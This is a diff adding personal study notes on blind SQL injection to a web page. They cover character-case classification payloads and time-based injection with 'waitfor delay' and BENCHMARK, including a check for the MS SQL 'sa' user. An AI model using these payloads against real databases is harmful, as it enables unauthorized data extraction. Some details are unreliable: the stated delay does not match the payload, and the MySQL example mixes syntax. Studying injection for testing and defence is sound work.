@@ -320,6 +320,43 @@ repeat the process to find the complete username.
 
 9999 or SUBSTRING(user_name(), 1, 1) = 'c';--
 
+it will be good to keep the process as fast as possible. the best way is to reduce the number of iterations you have to do per character. means, you need to be able to understand if the character is [A-Z]/[a-z]/[0-9]
+
+---technique discovered by SecForce
+
+FIRST: see if the convertion to uppercase of the character will yield TRUE or FALSE
+payload:
+
+ASCII(UPPER(SUBSTRING((<query>),<position>,1))) = ASCII(SUBSTRING((<query>),<position>,1))
+
+NOTE: ASCII() returns the ASCII code of a character. that will help to test if a character of a query is the same of its uppercase relative, because "a" does not equal to "A".
+
+the same process for lower case:
+
+ASCII(LOWER(SUBSTRING((<query>),<position>,1))) = ASCII(SUBSTRING((<query>),<position>,1))
+
+=> if UPPER is TRUE and LOWER is FALSE, the character is UPPERCASE [A-Z]
+=> if LOWER is TRUE and UPPER is FALSE, the character is LOWECASE [a-z]
+=> if both are TRUE, character is either number or symbol [0-9]
+
+SECOND: time-based blind sql injection, it is the time used to infer a TRUE condition from FALSE condition
+syntax:
+%SQL condition% waitfor delay '0:0:5'
+
+// if the SQL condition is TRUE, the DBMS will delay for 6 seconds
+
+__check for 'sa' user on MS SQL Server:
+if (SELECT user) = 'sa' waitfor delay '0:0:5'
+
+__guess a database value MySQL:
+IF EXISTS (SELECT *  FROM users WHERE username = 'armando') BENCHMARK(10000000,MD5(1))
+
+NOTE: it is time consuming. below code means that if the clause yields TRUE, it will perform MD5(1) function 10000000 times. 
+
+>>... SQLMAP TOOL USAGE
+
+
+
 
 </center>
 </body>
